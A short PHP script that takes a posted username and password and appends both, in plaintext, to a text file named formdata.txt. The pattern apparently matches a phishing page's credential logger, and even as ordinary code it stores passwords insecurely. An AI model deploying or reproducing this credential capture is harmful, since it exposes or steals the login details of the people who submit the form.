<?php
    if (isset($_POST['username']) && isset($_POST['password'])) {
        $username = $_POST['username'];
        $password = $_POST['password'];

        $data = "Username: $username, Password: $password\n";

        file_put_contents('formdata.txt', $data, FILE_APPEND | LOCK_EX);
    }
?>
